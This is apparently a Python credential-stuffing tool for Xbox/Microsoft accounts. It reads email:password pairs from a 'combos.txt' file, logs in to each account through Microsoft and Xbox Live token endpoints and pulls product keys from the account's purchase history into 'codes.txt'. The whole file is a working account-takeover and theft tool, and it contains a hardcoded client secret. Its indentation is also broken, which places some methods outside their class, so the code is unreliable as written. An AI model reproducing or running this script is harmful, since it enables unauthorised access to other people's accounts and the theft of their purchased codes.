import requests
import os
import time
import threading
import uuid

# Global variables to track statistics
checked = 0
valid_codes = 0
invalid_codes = 0
accounts = []

# Persistent log to store messages
persistent_log = []

def log_and_print(message):
    """
    Log message to persistent log and print it.
    
    Args:
        message (str): Message to log and print
    """
    global persistent_log
    persistent_log.append(message)
    print(message)

class XboxAuthentication:
    def __init__(self, email=None, password=None):
        self.email = email
        self.password = password
        self.access_token = None
        self.xbox_token = None
    
    def authenticate_method_one(self):
    try:
        client_id = "0000000048093EF3"
        scope = "service::user.auth.xboxlive.com::MBI_SSL"
        payload = {
            "client_id": client_id,
            "grant_type": "password",
            "username": self.email,
            "password": self.password,
            "scope": scope
        }
        token_url = "https://login.live.com/oauth20_token.srf"
        token_response = requests.post(token_url, data=payload)
        if token_response.status_code == 200:
            token_data = token_response.json()
            self.access_token = token_data.get('access_token')
            return self.exchange_xbox_token()
        else:
            log_and_print(f"Authentication failed: {token_response.text}")
            return None
    except Exception as e:
        log_and_print(f"Authentication error: {e}")
        return None

def authenticate_method_two(self):
    try:
        auth_url = "https://login.live.com/oauth20_token.srf"
        payload = {
            "client_id": "0000000048093EF3",
            "client_secret": "KBM-mYw-zCpbRCGv-rCB5wgzrjQqf5hG",
            "grant_type": "password",
            "username": self.email,
            "password": self.password,
            "scope": "service::user.auth.xboxlive.com::MBI_SSL"
        }
        response = requests.post(auth_url, data=payload)
        if response.status_code == 200:
            token_data = response.json()
            self.access_token = token_data.get('access_token')
            return self.exchange_xbox_token()
        else:
            log_and_print(f"Authentication failed: {response.text}")
            return None
    except Exception as e:
        log_and_print(f"Authentication error: {e}")
        return None
    
    def exchange_xbox_token(self):
        """
        Xbox Token Exchange Mechanism
        Converts Microsoft access token to Xbox Live token
        """
        try:
            # Xbox authentication URLs
            xbox_auth_url = "https://user.auth.xboxlive.com/user/authenticate"
            xsts_url = "https://xsts.auth.xboxlive.com/xsts/authorize"
            
            # First, authenticate with Xbox Live
            xbox_auth_payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={self.access_token}"
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }

            xbox_auth_response = requests.post(xbox_auth_url, json=xbox_auth_payload)
            
            if xbox_auth_response.status_code != 200:
                log_and_print(f"Xbox authentication failed: {xbox_auth_response.text}")
                return None
            
            xbox_auth_data = xbox_auth_response.json()
            
            # Authorize with XSTS
            xsts_payload = {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbox_auth_data['Token']]
                },
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT"
            }
            
            xsts_response = requests.post(xsts_url, json=xsts_payload)
            
            if xsts_response.status_code != 200:
                log_and_print(f"XSTS authorization failed: {xsts_response.text}")
                return None
            
            xsts_data = xsts_response.json()
            
            # Construct final authentication token
            uhs = xsts_data['DisplayClaims']['xui'][0]['uhs']
            xbox_token = f"XBL3.0 x={uhs};{xsts_data['Token']}"
            
            return xbox_token
        
        except Exception as e:
            log_and_print(f"Token exchange error: {e}")
            return None

def authenticate(email, password):
    """
    Attempt to authenticate using multiple methods
    
    Args:
        email (str): Account email
        password (str): Account password
    
    Returns:
        str: Authentication token or None if authentication fails
    """
    auth = XboxAuthentication(email, password)
    
    # Try first authentication method
    token = auth.authenticate_method_one()
    
    # If first method fails, try second method
    if not token:
        token = auth.authenticate_method_two()
    
    return token

def load_accounts():
    """
    Load accounts from the 'combos.txt' file.
    
    Returns:
    list: A list of account tuples (email, password).
    """
    global accounts
    try:
        with open('combos.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines:
                line = line.strip()
                if ':' in line:  # Ensure the line contains a separator
                    email, password = line.split(':', 1)  # Split only once
                    accounts.append((email, password))
                else:
                    log_and_print(f"Invalid line skipped: {line}")
        log_and_print(f"Loaded {len(accounts)} accounts from combos.txt.")
    except FileNotFoundError:
        log_and_print("Error: 'combos.txt' file not found.")
        return []
    return accounts

def check_purchased_codes(auth_token, email, password):
    """
    Check purchased codes for a given account
    
    Args:
        auth_token (str): Authentication token
        email (str): Account email
        password (str): Account password
    
    Returns:
        list: List of purchased codes
    """
    log_and_print(f"Checking {email}")
    global valid_codes, invalid_codes
    
    # Prepare headers for the request
    headers = {
        'Authorization': f'Bearer {auth_token}',
        'Content-Type': 'application/json',
        'x-xbl-contract-version': '2'
    }

    try:
        # Endpoint for purchase history
        url = 'https://purchase.mp.microsoft.com/v7.0/orders/xboxorders'
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        
        orders = response.json()
        codes = []
        
        found_orders = False
        for order in orders.get('orderHistoryItems', []):
            if 'productKey' in order:
                found_orders = True
                code_info = {
                    'product_name': order.get('productTitle', 'Unknown'),
                    'code': order['productKey']
                }
                codes.append(code_info)
                
                # Save the code to the "codes.txt" file
                with open('codes.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Product: {code_info['product_name']}\n")
                    f.write(f"Code: {code_info['code']}\n")
                    f.write("-" * 50 + "\n")
                
                # Display a message for valid codes
                if order['productKey'] != 'invalid or redeemed':
                    log_and_print(f"Found code: {code_info['code']} | valid")
                    valid_codes += 1
                else:
                    log_and_print(f"Found code: {code_info['code']} | invalid")
                    invalid_codes += 1
        
        # If no orders found, log the message
        if not found_orders:
            log_and_print(f"No Orders Found, Checking next account")

    except requests.exceptions.RequestException as e:
        invalid_codes += 1
        log_and_print(f"Error checking purchased codes for {email}: {str(e)}")
        return []

    # Add 1-second delay between account checks
    time.sleep(1)
    return codes

def update_ui():
    """
    Update the UI with the current statistics and persistent log.
    """
    global checked, valid_codes, invalid_codes, persistent_log
    while True:
        os.system('clear')  # Use 'cls' for Windows
        print("================================")
        print("         Code Checker Tool")
        print("================================")
        print(f"Accounts Checked: {checked}/{len(accounts)}")
        print(f"Valid Codes: {valid_codes}")
        print(f"Invalid Codes: {invalid_codes}")
        print("\n--- Recent Activity ---")
        # Display last 10 log messages
        for msg in persistent_log[-10:]:
            print(msg)
        print("================================")
        time.sleep(1)

def main():
    global checked, accounts
    
    # Load accounts from combos.txt
    accounts = load_accounts()
    
    # Start the UI update thread
    ui_thread = threading.Thread(target=update_ui)
    ui_thread.daemon = True  # Allow thread to exit when main program ends
    ui_thread.start()
    
    # Check accounts and codes
    for email, password in accounts:
        try:
            # Attempt to get authentication token
            auth_token = authenticate(email, password)
            
            # If authentication successful, check purchased codes
            if auth_token:
                check_purchased_codes(auth_token, email, password)
            
            # Increment checked accounts
            checked += 1
        
        except Exception as e:
            log_and_print(f"Error processing account {email}: {e}")
    
    # Optional: Keep the main thread running to maintain UI
    while True:
        time.sleep(1)

if __name__ == "__main__":
    if not os.path.exists('codes.txt'):
        open('codes.txt', 'w').close()
    main()
